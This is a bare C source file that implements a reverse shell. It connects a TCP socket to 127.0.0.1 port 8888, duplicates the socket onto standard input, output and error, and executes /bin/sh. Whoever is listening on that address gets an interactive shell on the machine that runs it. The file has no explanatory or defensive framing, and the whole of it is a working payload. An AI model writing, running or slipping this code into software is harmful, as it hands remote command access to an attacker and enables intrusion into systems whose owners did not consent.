#include<stdio.h> //printf
#include<string.h>    //strlen
#include<sys/socket.h>    //socket
#include<arpa/inet.h> //inet_addr

int main(int argc , char *argv[])
{
    int sock;
    struct sockaddr_in server;
 
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons( 8888 );
 
    sock = socket(AF_INET , SOCK_STREAM , 0);
    connect(sock , (struct sockaddr *)&server , sizeof(server));
    
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    
    execve("/bin/sh", 0, 0);
    return 0;
}
